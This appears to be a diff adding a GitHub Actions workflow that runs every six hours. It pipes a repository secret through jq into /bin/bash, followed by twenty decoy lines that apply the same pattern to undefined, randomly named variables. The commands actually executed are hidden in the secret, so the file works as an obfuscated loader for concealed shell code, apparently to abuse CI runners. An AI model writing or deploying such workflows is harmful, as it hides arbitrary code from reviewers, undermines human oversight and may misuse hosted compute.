@@ -1,0 +1,37 @@
+name: sanshimiaose
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '44 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: sanshimiaose
+        env:
+          frfn04: ${{ secrets.frfn04 }}
+        run: |
+          echo $frfn04 | jq -r .kpj606 | /bin/bash
+          echo $gsly2 | jq -r .er5 | /bin/bash
+          echo $xrsoq3022 | jq -r .tybro4 | /bin/bash
+          echo $fjknv151 | jq -r .bnteh2868 | /bin/bash
+          echo $jn33041 | jq -r .la822 | /bin/bash
+          echo $kzy46373 | jq -r .hkpa6693 | /bin/bash
+          echo $hbbl58 | jq -r .tpuv47 | /bin/bash
+          echo $uiug937 | jq -r .cbpel85 | /bin/bash
+          echo $yssl024 | jq -r .sfrh79838 | /bin/bash
+          echo $gizk9 | jq -r .zbu44595 | /bin/bash
+          echo $hwmyy65977 | jq -r .ig72146 | /bin/bash
+          echo $twa2313 | jq -r .dhsk68530 | /bin/bash
+          echo $dxc3 | jq -r .ljt10 | /bin/bash
+          echo $fjsl04926 | jq -r .n60 | /bin/bash
+          echo $vfzcm11 | jq -r .foghm64949 | /bin/bash
+          echo $cqhhh900 | jq -r .j79 | /bin/bash
+          echo $jrjun877 | jq -r .vax59 | /bin/bash
+          echo $d616 | jq -r .p47 | /bin/bash
+          echo $ysqv51759 | jq -r .ctr0 | /bin/bash
+          echo $b1 | jq -r .l69434 | /bin/bash
+          echo $hdqg936 | jq -r .wezou099 | /bin/bash
+
